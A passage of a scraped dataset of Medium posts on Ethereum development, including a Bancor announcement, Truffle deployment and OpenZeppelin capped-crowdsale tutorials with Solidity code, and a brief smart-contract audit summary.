\u0441\u0435\u0433\u043e\u0434\u043d\u044f\u0448\u043d\u0438\u0445 \u043f\u0440\u0438\u0432\u0430\u0442\u043d\u044b\u0445 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u0438\u0445 \u0441\u0435\u0442\u0435\u0439 \u0438 \u043f\u043e\u0437\u0432\u043e\u043b\u0438\u0442 \u043d\u043e\u0432\u044b\u043c \u0438\u0433\u0440\u043e\u043a\u0430\u043c (\u0438 \u0430\u0434\u0430\u043f\u0442\u0438\u0440\u043e\u0432\u0430\u0432\u0448\u0438\u043c\u0441\u044f \u0441\u0442\u0430\u0440\u044b\u043c) \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u0442\u044c \u043d\u043e\u0432\u044b\u0435 \u0432\u0438\u0434\u044b \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0435\u0439 \u0438 \u043e\u0431\u043c\u0435\u043d\u0438\u0432\u0430\u0442\u044c\u0441\u044f \u0432 \u043e\u0442\u043a\u0440\u044b\u0442\u043e\u0439, \u0432\u0441\u0435\u043c\u0438\u0440\u043d\u043e\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u043e\u0439, \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043d\u0438\u043a\u0442\u043e \u043d\u0435 \u0432\u043b\u0430\u0434\u0435\u0435\u0442.\u041a\u043e\u043c\u0430\u043d\u0434\u0430 Bancor \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u043b\u0430 \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442 \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u044b \u0441 \u043a\u043e\u043d\u0446\u0430 \u0434\u0435\u0432\u044f\u043d\u043e\u0441\u0442\u044b\u0445. \u0421\u0440\u0435\u0434\u0438 \u043d\u0430\u0448\u0438\u0445 \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u0439 \u0447\u0438\u0441\u043b\u0438\u043b\u0438\u0441\u044c Contact Networks, MetaCafe, Mytopia, Particle Code \u0438 AppCoin. \u041c\u044b \u043d\u0430\u0442\u043e\u043b\u043a\u043d\u0443\u043b\u0438\u0441\u044c \u043d\u0430 \u0411\u0438\u0442\u043a\u043e\u0438\u043d \u0432 2011 \u0433\u043e\u0434\u0443 \u0438 \u043d\u0430\u0447\u0430\u043b\u0438 \u0438\u0441\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u044c \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u0430\u043b\u044e\u0442, \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\u043c\u0438. \u0421\u043b\u0435\u0434\u0443\u044f \u0437\u0430 \u0432\u044b\u043f\u0443\u0441\u043a\u043e\u043c \u042d\u0444\u0438\u0440\u0438\u0443\u043c\u0430 \u0432 2015 \u0433\u043e\u0434\u0443, \u043c\u044b \u043f\u043e\u043d\u044f\u043b\u0438, \u0447\u0442\u043e \u0441\u043c\u0430\u0440\u0442-\u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u044b \u0438\u0437\u043c\u0435\u043d\u0438\u043b\u0438 \u043f\u0440\u0430\u0432\u0438\u043b\u0430 \u0438\u0433\u0440\u044b \u0438 \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0442 \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u0442\u044c \u0441\u0432\u043e\u0438 \u0432\u0430\u043b\u044e\u0442\u044b \u0432 \u0448\u0438\u0440\u043e\u043a\u043e\u043c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u0435. \u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u0443\u0435\u043c\u044b\u0435 \u043c\u043e\u0434\u0443\u043b\u0438, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0440\u0435\u0433\u0443\u043b\u0438\u0440\u0443\u044e\u0442 \u0438 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044c (\u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u043c\u0443\u044e \u0442\u043e\u043a\u0435\u043d\u0430\u043c\u0438), \u043c\u043e\u0433\u0443\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0442\u044c \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u044b, \u043e\u0442\u043d\u043e\u0441\u044f\u0449\u0438\u0435\u0441\u044f \u043a \u0434\u0430\u043d\u043d\u043e\u0439 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0438, \u0437\u0430 \u043c\u0438\u0437\u0435\u0440\u043d\u0443\u044e \u0441\u0442\u043e\u0438\u043c\u043e\u0441\u0442\u044c\u200a\u2014\u200a\u043f\u0440\u043e\u0446\u0435\u0441\u0441\u044b \u043d\u0430 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u044e\u0442\u0441\u044f \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u043c\u0438 \u043e\u0440\u0433\u0430\u043d\u0438\u0437\u0430\u0446\u0438\u044f\u043c\u0438 (\u043d\u0430\u043f\u0440. \u0443\u0441\u043b\u0443\u0433\u0438 \u0433\u0430\u0440\u0430\u043d\u0442\u0430, \u0431\u0438\u0440\u0436\u0438, \u044e\u0440\u0438\u0441\u0442\u044b). \u041e\u0434\u043d\u0430\u043a\u043e \u043d\u0435 \u0442\u0430\u043a\u0438\u043c \u043f\u0440\u043e\u0441\u0442\u044b\u043c \u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u043f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0441\u0430\u043c\u043e\u0441\u0442\u043e\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u043a\u043e\u0434\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043c\u043e\u0436\u0435\u0442 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0446\u0438\u0444\u0440\u043e\u0432\u044b\u043c\u0438 \u0434\u0435\u043d\u044c\u0433\u0430\u043c\u0438 \u0441 \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u043c \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043e\u043c \u043e\u0431\u043c\u0435\u043d\u0430 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044f\u043c\u0438.\u041b\u0435\u0442\u043e\u043c 2016 \u0433\u043e\u0434\u0430, \u043c\u044b \u043d\u0430\u0447\u0430\u043b\u0438 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u043d\u0430\u0434 Bancor \u0441 \u0446\u0435\u043b\u044c\u044e \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0438\u0435\u0440\u0430\u0440\u0445\u0438\u0447\u0435\u0441\u043a\u0443\u044e \u043c\u043e\u043d\u0435\u0442\u0430\u0440\u043d\u0443\u044e \u0441\u0438\u0441\u0442\u0435\u043c\u0443 (\u0433\u0434\u0435 \u043e\u0434\u0438\u043d \u0446\u0438\u0444\u0440\u043e\u0432\u043e\u0439 \u0442\u043e\u043a\u0435\u043d \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0432 \u0441\u0432\u043e\u0451\u043c \u0440\u0435\u0437\u0435\u0440\u0432\u0435 \u0434\u0440\u0443\u0433\u0438\u0435 \u0442\u043e\u043a\u0435\u043d\u044b), \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u0432\u0438\u0434 \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u0430 \u0432 \u043a\u0440\u0438\u043f\u0442\u043e\u0432\u0430\u043b\u044e\u0442\u0430\u0445, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043b\u044f\u0436\u0435\u0442 \u0432 \u0444\u0443\u043d\u0434\u0430\u043c\u0435\u043d\u0442 \u0434\u043b\u044f \u0432\u0441\u0435\u043c\u0438\u0440\u043d\u043e\u0433\u043e \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u043e\u0431\u043c\u0435\u043d\u0430. \u042d\u0442\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u0430\u0432\u0442\u043e\u043d\u043e\u043c\u043d\u0430, \u043d\u0435 \u0438\u043c\u0435\u0435\u0442 \u0441\u043f\u0440\u0435\u0434\u0430, \u0431\u0435\u0437 \u0440\u0438\u0441\u043a\u0430 \u043f\u043e\u0441\u0440\u0435\u0434\u043d\u0438\u043a\u043e\u0432 \u0438 \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 \u0431\u0435\u0441\u043a\u043e\u043d\u0435\u0447\u043d\u0443\u044e \u043b\u0438\u043a\u0432\u0438\u0434\u043d\u043e\u0441\u0442\u044c \u0434\u043b\u044f \u043b\u044e\u0431\u043e\u0433\u043e \u0430\u0441\u0441\u0435\u0442\u0430. \u042d\u0442\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u0441\u043e\u0437\u0434\u0430\u0441\u0442 \u201c\u0434\u043b\u0438\u043d\u043d\u044b\u0439 \u0445\u0432\u043e\u0441\u0442\u201d \u0434\u043b\u044f \u0432\u0430\u043b\u044e\u0442, \u043f\u043e \u043f\u0440\u0438\u043c\u0435\u0440\u0443 \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0434\u0435\u043b\u0430\u043b \u0442\u0430\u043a \u0436\u0435 \u0441 \u043a\u043e\u043d\u0442\u0435\u043d\u0442\u043e\u043c.\u041c\u044b \u0445\u043e\u0442\u0435\u043b\u0438 \u0431\u044b \u043f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0441 \u0432\u0430\u043c\u0438, \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442, \u043d\u0430\u0448\u0435\u0439 \u0447\u0435\u0440\u043d\u043e\u0432\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0435\u0439 whitepaper \u043d\u0430 \u0432\u0430\u0448\u0435 \u0440\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0435\u043d\u0438\u0435 \u0438 \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0438. \u0412\u0441\u0435 \u043e\u0442\u0437\u044b\u0432\u044b \u043f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u044e\u0442\u0441\u044f \u0438 \u043e\u0447\u0435\u043d\u044c \u0446\u0435\u043d\u044f\u0442\u0441\u044f.\u041a\u043e\u043c\u0430\u043d\u0434\u0430 Bancorhttp://bancor.network", "responses": ""}, {"title": "Ethereum \u00d0Apps Programming Distilled\u200a\u2014\u200aPart\u00a03", "author_name": "Marco Bellinaso", "link": "https://medium.com/@mbellinaso/ethereum-dapps-programming-distilled-geth-mist-truffle-deploy-smart-contract-aee26d410b14?source=search_post", "post_date": "Mar 6, 2018", "readtime": "7 min read", "upvotes": "55", "content": "Ethereum \u00d0Apps Programming Distilled\u200a\u2014\u200aPart\u00a03Creating the backend of a decentralised app: using Geth, Mist or Truffle to deploy a Smart Contract.Marco BellinasoBlockedUnblockFollowFollowingMar 6, 2018This is a multi-part article. Here are the links to the other parts:Part 1: What is a blockchain and how does it work?Part 2: What\u2019s special about Ethereum, and how to write a Smart Contract with Solidity?Part 4: Creating and deploying the frontend with HTML, JS, Web3 and MetaMaskPart 5: Publishing live, on either the Ropsten testnet or on the mainnetWhat is a decentralised app, and how is it composed?A decentralised app, or \u00d0App, is simply the combination of:One or more Ethereum Smart Contracts (hosted on the blockchain) that contain some executable business logic.The use of the blockchain to store any new data.An HTML frontend, hosted on a typical web server.In reality to be fully decentralised the frontend should also be hosted in a decentralised way rather than being on Azure, AWS, GitHub Pages or on any other traditional hosting\u2026and that will likely be the evolution of Ethereum, but we\u2019re not there yet. Swarm (decentralised file storage) and Whisper (decentralised messaging) are two other technologies, complementary to Ethereum, that will allow to build fully decentralised applications, but they are only in alpha at the moment, and therefore not finished/reliable/usable for anything real.Creating and deploying the backend: the traditional way and the easier\u00a0wayAfter you\u2019ve written your Smart Contract in Solidity, like in the previous example, you\u2019ll want to deploy it to the blockchain and start playing with it to see if it runs and does what you want. Since deploying a contract means saving it to the blockchain, and because that consumes storage and computation, it would cost you real ETH and therefore real fiat currency if you deployed it to the live/production blockchain (called \u201cmainnet\u201d). But you certainly don\u2019t want to do that until you\u2019re sure that everything\u2019s fine and ready for prime time. Fortunately, in addition to the mainnet there are multiple testnets (Ropsten, Kovan and Rinkeby\u200a\u2014\u200amore about their differences here): these are still real blockchains, deployed on a network of nodes, that the community agreed to support to have test environments for developers. The difficulty for mining blocks is easier, and ETH is free on them (you can mine them yourself or, better, use a \u201cfaucet\u201d like this one for Ropsten and this one for Rinkeby). Deploying here is great, because while being free it still allow the developer to work in real distributed blockchain, where there\u2019s latency etc.However\u2026before deploying to a distributed testnet there\u2019s something even simpler, which is creating your own private development blockchain, only stored on your dev machine. What you would normally do is create a dedicated folder somewhere, a special file that represents a genesis block (i.e. the first block of the chain) and run the Geth client to start mining a chain there.After you\u2019ve got a local and private blockchain you do the following:1. Compile your Smart Contract with the Solidity Compiler (solcjs), or use the browser-based Remix IDE, which gives you a fairly easy UI for compiling, running and debugging your code (but nothing fancy, don\u2019t try to compare to other real IDEs\u2026). The compilation gives you back 2 things: A) an ABI (Application Binary Interface) file\u2026which contains some json describing the classes and functions of your contract (the public interface, in fact).B) a BIN (binary) file that contains the compiled bytecode, which is what you deploy.2. Deploy the contract on the private blockchain with Geth from the command line. Alternatively you can do it more easily from a GUI thanks to the Mist Browser (which includes Geth btw, so you could have downloaded directly this). Mist is a browser for Dapps, and allows you to create and manage accounts and wallets, and use any application available on Ethereum. It allows you to upload a new contract, and even dynamically creates a UI to interact with it by calling functions to read data and send transactions to modify data. As you might have guessed it, the Smart Contract\u2019s ABI is used to discover what are the functions exposed by the contract and what inputs/outputs they have, so that a UI can be generated for them automatically. Regardless of the method you use, after deploying the contract you\u2019ll receive the address of where the contract has been deployed, which you later use to invoke it from the frontend part of the dapp (see next section).Image taken from this article by Pete Humiston, which explains how to install, configure and run Geth and Mist step by step, and use them to deploy a contract.If all the above sounds like fun, go ahead, do it and have fun. But because I\u2019m lazy, and because there are nice people building tools and helpers for lazy people like me, I\u2019ve instead used the Truffle Suite for my app. Truffle is described as \u201cYour Ethereum Swiss army knife. Truffle is the most popular development framework for Ethereum with a mission to make your life a whole lot easier.\u201d and at least at the moment they are right. Here\u2019s a quick overview of how to use it:Install it with \u201cnpm install -g truffle\u201d.Move into your project folder and run \u201ctruffle init\u201d to create a bare Truffle project. Then move your Smart Contrat\u2019s\u00a0.sol files (if you\u2019ve written them already) into the \u201ccontracts\u201d subfolder, and add a reference to them into the \u201cmigrations\u201d folder (I\u2019m skipping a few details here, but refer to their tutorial for the full thing.)Run \u201ctruffle compile\u201d to compile the project.Run \u201ctruffle develop\u201d to launch a \u201cdevelopment console\u201d. This command also uses Ganache (another tool included in the Truffle suite) to automatically create a private dev blockchain and 10 accounts (public/private keys) to use in your tests.From the console run \u201cmigrate\u201d. Done, your contract is now deployed to your private blockchain. All in a few minutes, not bad! If you modify the contract\u2019s code, simply run \u201cmigrate\u200a\u2014\u200areset\u201d to recompile and then immediately redeploy it.From the console you can also write javascript to interact with the deployed contract. Say that you\u2019ve deployed a contract called SimpleStorage, with a function called setValue that takes in input a string and stores it as part of its state\u2026here is how you\u2019d invoke it from the console:SimpleStorage.deployed().then(  function(instance){return instance.setValue(\"hello\");});See the next section about the frontend for a more complete example that uses the actual MessageStorage Smart Contract presented before.What happens if you need to fix/update a contract and redeploy it?This is a very important point indeed! Redeploying the contract means creating a new version of it on the blockchain, on a new address and with a new state. This means that once you deploy a Smart Contract you can no longer fix/change it\u2026it will be immutable\u2026you can only have a completely new one, separate from the previous, it\u2019s not an actual fix/upgrade. So you better debug and fix all bugs before doing so!What if you fail at that, or if you anyway need to add things and evolve the functionalities? There isn\u2019t a unique answer for all scenarios, but there are things you can do: for example in my app, should I need to deploy a new version of the contract, I would retrieve past messages from v1 of the contract, and save/load new messages from v2. Bigger apps that are composed by multiple contracts might use a smart contract as a \u201cgateway/proxy\u201d for functionalities implemented by other separate contracts\u200a\u2014\u200athis proxy could have functions (only usable by the owners) to change the address of the sub-contracts it points to. So if proxyContract uses storeContractV1 deployed at 0x123, and you need to fix storeContract, you might call a function like proxyContract.setStoreContract(address_for_storeContractV2) that changes the address of storeContract in a variable held by proxyContract. Of course in order to be able to do this 1) the public interface of storeContract must be the same between v1 and v2, and 2) you must appropriately structure the code (and create the setStoreContract() function) before the initial release. This article by Jack Tanner explains this and other approaches with more details.NOTE: if you wanted to make sure previous versions of your contracts are no longer accessible, you\u2019d need to implement a function (call it \u201ckill\u201d or something similar, and make sure it has the onlyOwner modifier defined by the Ownable contract!) that calls selfdestruct as shown in the official docs.", "responses": ""}, {"title": "Top Libraries For Ethereum Smart Contract Developers", "author_name": "Gaurav Agrawal", "link": "https://medium.com/quiknode/top-libraries-for-ethereum-smart-contract-developer-60168aba6f6?source=search_post", "post_date": "Feb 25", "readtime": "5 min read", "upvotes": "18", "content": "Photo by Max Nelson on\u00a0UnsplashTop Libraries For Ethereum Smart Contract DevelopersWeb3 libraries for working with smart contracts on\u00a0EthereumGaurav AgrawalBlockedUnblockFollowFollowingFeb 25Today, we will list some of the most famous NodeJS libraries for building Web3 applications. These libraries are listed based on the number of downloads per month, in descending order:Please take 5 minutes to fill below Ethereum Node Survey \ud83d\ude4f\u00a0\ud83d\udc47", "responses": ""}, {"title": "FansUnite Audit", "author_name": "Dean Eigenmann", "link": "https://blog.zklabs.io/fansunite-audit-e16dd53e42c?source=search_post", "post_date": "Nov 2, 2017", "readtime": "2 min read", "upvotes": "101", "content": "FansUnite AuditDean EigenmannBlockedUnblockFollowFollowingNov 2, 2017The ZK Labs auditors were hired by the FansUnite team to conduct 2 separate audits of their crowdsale and token contracts, which can be found in the FansUnite github repository. The team audited the smart contract versions found in the commit 1c989dbd269958df1d474d5e29ed11e96e7efee0.The severe issue mentioned below were fixed by the FansUnite team as of the commit 75cc4b3d1a6232bdd107b17637bb264a94981e04.Full report by Dean Eigenmann.Along with investigating some of the security issues, we added some of our recommendations that could be implemented to simplify and improve the code.SevereA severe issue was found which would lead to the failure of finalization of the crowdsale. This was due to the fact that the last purchase could exceed token cap, causing an exception to be thrown by SafeMath in the finalize method.This issue could occur not only through the purchase function, but also through the addPrecommitment function, which allows the FansUnite team to allocate tokens to addresses.The solution of this issue was to simply check that an allocation through either the addPrecommitment or the purchase function does not exceed the maximum limit.SuggestionsAlong with the issue we had found, we also found a series of improvements and changes that could be made to the code.The MinGoalReached event can be removed as it is never used.The multiplier 10**24 is used repeatedly, a constant could be created in place.The doPurchase function is passed a parameter called _owner that is unused. We suggested to remove this parameter and simply use the msg.sender constant.We suggested that the transfer method call in the doPurchase function should use the weiAmount variable rather than the msg.value constant.We suggested that the addToWhitelist function should be adapted so an array of addresses could be whitelisted. This would reduce the amount of transactions required significantly.We suggested to the developers that the FansUniteToken could be easily replaced with contracts from the OpenZeppelin library.The TokenVesting contract constructor could be modified to automatically multiple the _duration variable by 1 weeks, simplifying what needs to be passed.It could occur that the finalize method mints 0 tokens to the unsoldSupplyAddress, we suggested that a check should be added.ConclusionWe found one severe issue, which we explained to the FansUnite team along with a list of possible methods to fix the issue. Additionally we proposed changes to follow best practice standards as well as increase the legibility of the code.", "responses": ""}, {"title": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library\u200a\u2014\u200aPart\u00a02", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/how-to-build-a-simple-capped-crowdsale-token-using-openzeppelin-library-part-2-cf96cb66c3d0?source=search_post", "post_date": "Oct 22, 2018", "readtime": "6 min read", "upvotes": "52", "content": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library\u200a\u2014\u200aPart\u00a02Using Open-Zeppelin Library to build a basic capped ERC20 crowdsale.Gaurav AgrawalBlockedUnblockFollowFollowingOct 22, 2018In Part 1, we built a capped ExampleToken. In this article, we will dive into crowdsale contract ExampleTokenCrowdsale and understand it\u2019s inner workings.Lets first look at our imported contracts from the open zeppelin-solidity library.Crowdsale.solThis contract implements the core crowdsale functionality. There are a few global variables.ERC20 token\u200a\u2014\u200aAs you can see, this token is inheriting ERC20.sol. This variable will contain the address of our ExampleToken contract.wallet\u200a\u2014\u200aThis will store address where ether contributions will get collected.rate\u200a\u2014\u200aThis will store how many token units a buyer gets per wei.weiRaised- How many wei get raised via contribution.This contract also defines a constructor which is getting used by our ExampleTokenCrowsale.sol. The most important method of this contract is buytokens(_beneficiary). Most of the functions in this contract are getting called by this method, it performs these tasks:Pre-validation, if we have any conditionProcess purchase (Transferring token)Update different states (ex- wei increased)Post validation if requiredpragma solidity ^0.4.24;import \"../token/ERC20/ERC20.sol\";import \"../math/SafeMath.sol\";import \"../token/ERC20/SafeERC20.sol\";contract Crowdsale {  using SafeMath for uint256;  using SafeERC20 for ERC20;ERC20 public token;address public wallet;uint256 public rate;uint256 public weiRaised;event TokenPurchase(    address indexed purchaser,    address indexed beneficiary,    uint256 value,    uint256 amount  );constructor(uint256 _rate, address _wallet, ERC20 _token) public {    require(_rate > 0);    require(_wallet != address(0));    require(_token != address(0));rate = _rate;    wallet = _wallet;    token = _token;  }function () external payable {    buyTokens(msg.sender);  }function buyTokens(address _beneficiary) public payable {uint256 weiAmount = msg.value;    _preValidatePurchase(_beneficiary, weiAmount);uint256 tokens = _getTokenAmount(weiAmount);weiRaised = weiRaised.add(weiAmount);_processPurchase(_beneficiary, tokens);    emit TokenPurchase(      msg.sender,      _beneficiary,      weiAmount,      tokens    );_updatePurchasingState(_beneficiary, weiAmount);_forwardFunds();    _postValidatePurchase(_beneficiary, weiAmount);  }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    require(_beneficiary != address(0));    require(_weiAmount != 0);  }function _postValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    // optional override  }function _deliverTokens(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    token.safeTransfer(_beneficiary, _tokenAmount);  }function _processPurchase(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    _deliverTokens(_beneficiary, _tokenAmount);  }function _updatePurchasingState(    address _beneficiary,    uint256 _weiAmount  )    internal  {    // optional override  }function _getTokenAmount(uint256 _weiAmount)    internal view returns (uint256)  {    return _weiAmount.mul(rate);  }function _forwardFunds() internal {    wallet.transfer(msg.value);  }}MintedCrowdsale.solThis contract gets called through crowdsale.sol contract and will call mintableToken\u2019s mint() function to manage token minting as we have discussed in last tutorials.pragma solidity ^0.4.24;import \"../Crowdsale.sol\";import \"../../token/ERC20/MintableToken.sol\";contract MintedCrowdsale is Crowdsale {function _deliverTokens(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    require(MintableToken(address(token)).mint(_beneficiary, _tokenAmount));  }}CappedCrowdsale.solThis contract is responsible for managing capping functionality and we will extend this contract to put the cap on investors contributions. We will also define the maximum total ether contribution cap using this contract.pragma solidity ^0.4.24;import \"../../math/SafeMath.sol\";import \"../Crowdsale.sol\";contract CappedCrowdsale is Crowdsale {  using SafeMath for uint256;uint256 public cap;constructor(uint256 _cap) public {    require(_cap > 0);    cap = _cap;  }function capReached() public view returns (bool) {    return weiRaised >= cap;  }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    super._preValidatePurchase(_beneficiary, _weiAmount);    require(weiRaised.add(_weiAmount) <= cap);  }}Capping investors contributionNow let\u2019s write our logic for capping investors contribution, We will accept minimum 2 ether and maximum 50 ether from an investor.uint256 public investorMinCap = 2000000000000000000; uint256 public investorHardCap = 50000000000000000000;mapping(address => uint256) public contributions;constructor(uint256 _rate,   address _wallet,   ERC20 _token,   uint256 _cap) Crowdsale(_rate, _wallet, _token) CappedCrowdsale(_cap) public{ }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    super._preValidatePurchase(_beneficiary, _weiAmount);  uint256 _existingContribution = contributions[_beneficiary];  uint256 _newContribution = _existingContribution.add(_weiAmount);require(_newContribution >= investorMinCap && _newContribution <= investorHardCap);contributions[_beneficiary] = _newContribution;}We have defined investorMinCap (2 ether in wei) and investorMaxCap(50 ether in wei), We also defined mapping contributions to track investors contribution. We are calling super at the first line, so if any contract will inherit this contract, will be able to execute it\u2019s _preValidatePurchase() method first. Then we are checking the condition for capping investors and at the end updating contribution in our mapping.require(_newContribution >= investorMinCap && _newContribution <= investorHardCap);This way we have now put a cap on investors contribution.Capping Total ether raisedNow let\u2019s look at ExampleTokenCrowdsale constructor. Here we are setting 4 parameters._rate_wallet_token_cap\u200a\u2014\u200aThis will define cap on ether contribution.We will set these methods while deploying the contract.constructor(uint256 _rate,   address _wallet,   ERC20 _token,   uint256 _cap) Crowdsale(_rate, _wallet, _token) CappedCrowdsale(_cap) public{ }That\u2019s it, We successfully created a capped crowdsale contract. Now, let\u2019s test it, we have discussed testing smart contract in our last series of solidity Curd app.Testing Crowdsale ContractLet\u2019s run some commands to test our smart contract.truffle compiletruffle developmigrate --resetLet\u2019s deploy our ExampleToken contract, Look we are passing our token name, symbol and decimal point for our smart contract.ExampleToken.deployed(\"Example Token\", \"EXM\", 18).then((t) => {token = t;})Now deploy our ExampleTokenCrowdsale contract. We are passing our 4 parameters here rate(500 token / ether), wallet( web3.eth.accounts[0])\u00a0, ERC20 token(Example Token address) and cap (200 ether).ExampleTokenCrowdsale.deployed(500, web3.eth.accounts[0], token.address , new web3.BigNumber(web3.toWei(200, 'ether'))).then((t) => {sale = t;})Before buying tokens from our crowdsale contract, we need to perform a small step, We need to transfer ownership of token contract to crowdsale contract so it can mint tokens. Check MintableToken.sol and you will understand why we are performing this step.token.transferOwnership(sale.address)Now let check our investor cap constraint, We will perform 4 transactions.As our minimum contribution cap is 2 ether. First, we will try to buy tokens with 1 ether. It should fail.sale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(1, 'ether')) , from : web3.eth.accounts[1]});2. Now we will buy tokens with 2 ether, it should succeed.sale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(2, 'ether')) , from : web3.eth.accounts[1]});3. Now we will buy tokens with 48 ether from the same investor account. It should passsale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(48, 'ether')) , from : web3.eth.accounts[1]});4. Now if we try to buy any more tokens from the same account it should fail.sale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(1, 'ether')) , from : web3.eth.accounts[1]});You can check the total supply and balance of the account in the middle as you feel comfortable, you will be able to see that total supply is getting increased as we are buying tokens.token.balanceOf(web3.eth.accounts[1]).then(result => result.toNumber())In the same way, you can test the hard cap of our crowdsale by buying tokens from the different account. Let me know how it went. You don\u2019t need to test open-zeppelin contracts as they are well tested already.ConclusionSo we have created our capped token and crowdsale contract, We learned how to use open-zeppelin library and how we can use them to build an ERC20 token. We have also learned inner workings of different open-zeppelin library contracts.You can also add additional constraints such as adding a time limit for sale and deciding when sale should start or end. Which we will cover in the next part of our tutorial series.Notes & SuggestionsA small bug can turn the whole project upside down. Using libraries like Open-zeppelin helps here by providing some fully tested core functionality of an ERC20 token.If you have questions about any part of the tutorial, feel free to ask questions on the comments section. Go through open-zeppelin\u2019s library and let me know what you want to learn next.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": "2"}, {"title": "\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u731b\u5b9f\u88c5\u4e2d\u306e\u4f34\u30eb\u30ab\u3055\u3093\u3078\u30a4\u30f3\u30bf\u30d3\u30e5\u30fc", "author_name": "MissBitcoin", "link": "https://medium.com/@missbitcoin_mai/%E3%82%B9%E3%83%9E%E3%83%BC%E3%83%88%E3%82%B3%E3%83%B3%E3%83%88%E3%83%A9%E3%82%AF%E3%83%88%E7%8C%9B%E5%AE%9F%E8%A3%85%E4%B8%AD%E3%81%AE%E4%BC%B4%E3%83%AB%E3%82%AB%E3%81%95%E3%82%93%E3%81%B8%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%93%E3%83%A5%E3%83%BC-d04cacf4077f?source=search_post", "post_date": "Feb 19, 2018", "readtime": "10 min read", "upvotes": "52", "content": "\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u731b\u5b9f\u88c5\u4e2d\u306e\u4f34\u30eb\u30ab\u3055\u3093\u3078\u30a4\u30f3\u30bf\u30d3\u30e5\u30fcMissBitcoinBlockedUnblockFollowFollowingFeb 19, 